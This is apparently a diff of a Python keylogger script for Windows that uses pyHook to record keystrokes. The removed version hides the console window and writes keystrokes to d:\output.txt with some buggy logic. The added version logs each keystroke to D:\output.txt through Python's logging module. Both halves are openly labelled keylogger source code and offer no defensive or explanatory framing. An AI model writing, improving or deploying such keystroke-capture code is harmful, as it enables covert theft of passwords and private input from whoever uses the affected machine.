@@ -1,33 +1,15 @@
-# Python code for keylogger 
-# to be used in windows 
-import win32api 
-import win32console 
-import win32gui 
-import pythoncom, pyHook 
-  
-win = win32console.GetConsoleWindow() 
-win32gui.ShowWindow(win, 0) 
-  
-def OnKeyboardEvent(event): 
-    if event.Ascii==5: 
-        _exit(1) 
-    if event.Ascii !=0 or 8: 
-    #open output.txt to read current keystrokes 
-        f = open('d:\output.txt', 'r+') 
-        buffer = f.read() 
-        f.close() 
-    # open output.txt to write current + new keystrokes 
-        f = open('d:\output.txt', 'w') 
-        keylogs = chr(event.Ascii) 
-        if event.Ascii == 13: 
-            keylogs = '/n'
-            buffer += keylogs 
-        f.write(buffer) 
-        f.close() 
-# create a hook manager object 
-hm = pyHook.HookManager() 
-hm.KeyDown = OnKeyboardEvent 
-# set the hook 
-hm.HookKeyboard() 
-# wait forever 
-pythoncom.PumpMessages() 
+import pyHook, pythoncom, sys, logging
+
+file_log = "D:\\output.txt"
+
+def onKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    print(f'event = {event}\nevent.Ascii = {event.Ascii}')
+    chr(event.Ascii)
+    logging.log(10, chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = onKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
